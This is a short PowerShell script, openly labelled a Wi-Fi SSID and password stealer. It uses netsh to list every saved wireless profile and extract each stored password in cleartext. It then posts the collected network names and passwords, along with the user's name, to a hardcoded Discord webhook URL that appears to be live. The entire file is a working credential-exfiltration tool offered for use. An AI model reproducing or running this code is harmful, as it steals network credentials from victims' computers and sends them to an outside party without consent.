#Wifi SSID and password stealer
#Sends out saved Wifi networks and the password if available

#Yes I know this url shouldn't be publicly displayed
$webhookUrl  = 'https://discord.com/api/webhooks/1168997833945403443/b9KVbM7c72rekuk8um12U5Uz_9Elu_tz5aLeFKgzYBpK4MSQepewl3iDPtt4RrMGV3oG'

$networks = netsh wlan show profiles
$begin = [array]::indexof($networks,"User profiles") + 2
$end = $networks.Length - 2
$names = @()
$result = ""

#Get an array of all saved Wifi network names
for($i = $begin; $i -le $end; $i++)
{
	$names += $networks[$i].substring($networks[$i].IndexOf(': ') + 2)
}

#Loop through all names and get the profile of each network
foreach($network in $names)
{
	$profile = netsh wlan show profile name=$network key=clear
	$name = ""
	$pass = ""
	$combo = ""
 	#Loop through the lines in the profile and look for the SSID and password
	foreach($line in $profile)
	{
		if($line.IndexOf('Key Content') -ne -1)
		{
			$pass = $line.substring($line.IndexOf(': ') + 2)
		}
		elseif($line.IndexOf('SSID name') -ne -1)
		{
			$name = $line.substring($line.IndexOf(':') + 2).Trim('"')
		}
	}
 	#If no password is available, set it to "Not Available"
	if($pass -eq "")
	{
		$pass = "Not Available"
	}
 	#Add SSID and password combo to result
	$combo = $name + " - " + $pass + "`n"
	$result += $combo
}

#Discord webhook send code from I-Am-Jakoby
$Body = @{
	'username' = $env:username
	'content' = "----------------------------`n`n" + $result + "`n`n"
}
Invoke-RestMethod -ContentType 'Application/Json' -Uri $webhookUrl  -Method Post -Body ($Body | ConvertTo-Json)

EXIT
